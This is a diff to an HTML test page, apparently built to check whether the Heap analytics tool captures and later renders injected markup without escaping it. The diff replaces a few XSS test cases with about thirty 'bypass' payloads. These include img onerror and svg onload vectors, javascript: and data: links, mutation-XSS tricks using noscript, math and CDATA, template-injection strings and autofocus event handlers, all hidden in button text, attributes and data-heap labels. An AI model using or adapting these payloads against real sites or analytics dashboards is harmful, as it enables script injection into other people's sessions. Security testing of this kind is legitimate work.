@@ -39,51 +39,54 @@
 </head>
 <body>
 
-  <!-- 1. XSS in button text (innerText) -->
-  <button id="btn-xss-text">
-    <script>alert(1)</script>Start Trial
-  </button>
+  <!-- BYPASS 1: Raw text in button/link innerText (no URL encoding) -->
+  <button id="b1"><img src=x onerror=alert(document.domain)></button>
+  <button id="b2"><svg/onload=alert(document.domain)></button>
+  <button id="b3"><script>alert(document.domain)</script>Click Me</button>
 
-  <!-- 2. XSS in anchor href (href value) -->
-  <a href="javascript:alert(document.cookie)" id="link-xss-href">
-    View Pricing
-  </a>
+  <!-- BYPASS 2: href values -->
+  <a href="javascript:alert(document.domain)" id="a1">Pricing</a>
+  <a href="data:text/html,<script>alert(document.domain)</script>" id="a2">Docs</a>
+  <a href="#" title='"><svg onload=alert(document.domain)>' id="a3">Blog</a>
 
-  <!-- 3. XSS in input placeholder -->
-  <input 
-    type="text" 
-    placeholder='"><img src=x onerror=alert(document.domain)>'
-    id="input-xss-placeholder"
-  >
+  <!-- BYPASS 3: Input placeholders & values -->
+  <input type="text" placeholder='"><img src=x onerror=alert(document.domain)>' id="i1">
+  <input type="text" value='"><img src=x onerror=alert(document.domain)>' id="i2">
+  <input type="text" name='"><svg onload=alert(1)>' id="i3">
 
-  <!-- 4. XSS in data attributes (Heap may capture these) -->
-  <button 
-    data-heap-label='<script>alert(1)</script>'
-    data-action="signup"
-    id="btn-xss-attr"
-  >
-    Get Started
-  </button>
+  <!-- BYPASS 4: data attributes Heap may capture -->
+  <button data-heap-label='<script>alert(document.domain)</script>' id="b4">Sign Up</button>
+  <button data-action='"><svg onload=alert(1)>' id="b5">Login</button>
+  <button data-category="<img src=x onerror=alert(1)>" id="b6">Submit</button>
 
-  <!-- 5. Polyglot payload — works in multiple contexts -->
-  <a 
-    href="#test"
-    title='"><svg onload=alert(1)>'
-    aria-label='"><svg onload=alert(1)>'
-    id="link-polyglot"
-  >
-    "><svg onload=alert(1)>Features
-  </a>
+  <!-- BYPASS 5: Unicode normalization -->
+  <button id="b7">＜script＞alert(1)＜/script＞</button>
+  <button id="b8">&#x3C;img src=x onerror=alert(1)&#x3E;</button>
+  <a href="#" id="a4">\u003cscript\u003ealert(1)\u003c/script\u003e</a>
 
-  <!-- 6. HTML entity bypass attempt -->
-  <button id="btn-entity">
-    &lt;img src=x onerror=alert(1)&gt;
-  </button>
+  <!-- BYPASS 6: Mutation XSS / namespace confusion -->
+  <a href="#" id="a5"><svg><![CDATA[</svg><script>alert(1)</script>]]></a>
+  <button id="b9"><math><mi//xlink:href="data:x,<script>alert(1)</script>"></math></button>
+  <button id="b10"><noscript><p title="</noscript><img src=x onerror=alert(document.domain)>"></button>
 
-  <!-- 7. URL-encoded payload in href -->
-  <a href="%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E" id="link-encoded">
-    Documentation
-  </a>
+  <!-- BYPASS 7: CSS injection via aria/title attributes -->
+  <button id="b11" aria-label='");}</style><img src=x onerror=alert(1)>'>Upgrade</button>
+  <button id="b12" style="background:url('javascript:alert(1)')" id="b13">Dashboard</button>
+  <span id="s1" title="background:expression(alert(1))">Features</span>
+
+  <!-- BYPASS 8: Template literal / JS context break -->
+  <button id="b14">`-alert(document.domain)-`</button>
+  <button id="b15">'+alert(document.domain)+'</button>
+  <button id="b16">{{constructor.constructor('alert(1)')()}}</button>
+
+  <!-- BYPASS 9: HTML comment breakout -->
+  <button id="b17"><!--<img src=x onerror=alert(1)>--></button>
+  <a href="#--><img src=x onerror=alert(1)>" id="a6">Help</a>
+
+  <!-- BYPASS 10: Event handler in element text -->
+  <button id="b18" onmouseover="alert(document.domain)">Hover Me</button>
+  <button id="b19" onfocus="alert(document.domain)" autofocus>Auto Focus</button>
+  <a href="#" onclick="alert(document.domain)" id="a7">Click Track</a>
 
 </body>
 </html>
